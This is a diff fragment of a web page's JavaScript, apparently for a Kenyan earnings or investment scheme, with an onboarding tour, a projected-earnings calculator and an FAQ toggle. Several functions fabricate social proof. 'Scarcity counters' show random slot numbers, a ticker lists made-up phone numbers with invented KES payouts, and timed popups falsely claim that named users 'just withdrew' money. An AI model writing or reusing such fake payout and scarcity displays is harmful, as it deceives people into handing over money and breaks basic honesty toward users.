+        document.getElementById('tourText').innerText = tourData[tourStep].text;
+    }
+
+    function nextTourStep() {
+        tourStep++;
+        if(tourStep >= tourData.length) {
+            document.getElementById('tourOverlay').style.display = 'none';
+            localStorage.setItem('sphere_tour_done', 'true');
+        } else { updateTour(); }
+    }
+
+    // INTERACTIVE CALCULATOR
+    function updateCalc(v) {
+        document.getElementById('tVal').innerText = v;
+        document.getElementById('eVal').innerText = (v * 700 * 7).toLocaleString();
+    }
+
+    // SCARCITY COUNTERS
+    setInterval(() => {
+        document.getElementById('h1').innerText = Math.floor(Math.random()*15 + 1) + " slots";
+        document.getElementById('h2').innerText = Math.floor(Math.random()*6 + 1) + " slots";
+    }, 4000);
+
+    // FAQS
+    function toggleFaq(index) {
+        const contents = document.querySelectorAll('.faq-content');
+        const display = contents[index].style.display;
+        contents[index].style.display = (display === 'block') ? 'none' : 'block';
+    }
+
+    // TICKER & POPUPS
+    function buildTicker() {
+        const box = document.getElementById('tickerBox');
+        let html = '';
+        for(let i=0; i<30; i++) {
+            html += `<div class="payout-row"><div>072xxxx${Math.floor(100+Math.random()*800)}</div><div style="color:var(--accent); font-weight:900;">KES ${(Math.floor(Math.random()*50)+5)*100}</div><div style="opacity:0.5;">OS-${Math.floor(1000+Math.random()*9000)}</div></div>`;
+        }
+        box.innerHTML = html + html;
+    }
+
+    setInterval(() => {
+        const names = ['0722***492', '0112***834', '0798***112', '0743***009'];
+        document.getElementById('pText').innerHTML = `<strong>${names[Math.floor(Math.random()*4)]}</strong> just withdrew KES ${(Math.floor(Math.random()*45)+5)*100}`;
+        document.getElementById('payoutPopup').style.display = 'flex';
+        setTimeout(() => { document.getElementById('payoutPopup').style.display = 'none'; }, 4000);
+    }, 13000);
 </script>
 </body>
 </html>
+❣️
